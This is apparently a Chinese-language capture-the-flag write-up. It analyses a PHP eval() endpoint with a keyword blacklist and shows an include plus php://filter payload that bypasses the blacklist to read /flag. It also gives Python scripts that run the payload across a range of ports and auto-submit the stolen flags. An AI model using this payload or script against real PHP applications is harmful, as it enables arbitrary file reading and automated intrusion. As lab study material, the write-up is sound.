## level 0

#### 知识积累

1.[php伪协议](https://blog.csdn.net/nzjdsds/article/details/82461043)

2.php不需要括号的函数

```php
<?php
echo 123;
print 123;
die;
include "/etc/passwd";
require "/etc/passwd";
include_once "/etc/passwd";
require_once "etc/passwd";
?>

```



#### 分析代码

```php
<?php
error_reporting(0);
if(isset($_GET['cmd'])){
    $c = $_GET['cmd'];
    if(!preg_match("/cat|system|exec|tac|more|tail|flag|`|sort|\.|shell| |php/i", $c)){
        echo "flag藏在/flag";
        echo "<br>";
        eval($c);
    }
    else
    {
        die('hacker!!');
    }
    
}else{
    highlight_file(__FILE__);
}

?>
```

1.过滤了cat,system,exec,tac,more,tail,flag,`,sort,.,shell,php,空格

 2.`echo "flag藏在/flag"`提示了flag藏在/flag



所以得到playload：?cmd=include$_GET["a"]？>&a=php://filter/read=convert/resource=/flag

访问得到flag

## level 1

```python
import requests
url1 = 'http://172.23.26.66:'
url2 ='/?cmd=include$_GET["a"]?>&a=php://filter/read=convert/resource=/flag'
for i in range(12345 , 12355):
  url = url1+ str(i)+ url2
  r = requests.get(url)
  print (r.text[15:])

```

结果如下

![](https://i.loli.net/2021/02/03/u7Syqr2RhMUiJGO.png)



## level2

```python
import requests
import json
url1 = 'http://172.23.26.66:'
url2 ='/?cmd=include$_GET["a"]?>&a=php://filter/read=convert/resource=/flag'
url3 ='http://172.23.26.66:10001/submit.php'
for i in range(12345 , 12355):
  url = url1+ str(i)+ url2
  r = requests.get(url)
  flag = r.text[15 :53]
  data={'myflag':flag}
  result = requests.post(url3,data=data)
  print(result.text)
```

结果如下

![image-20210206192804742](https://i.loli.net/2021/02/06/ye1IMqivBWwpY9C.png)

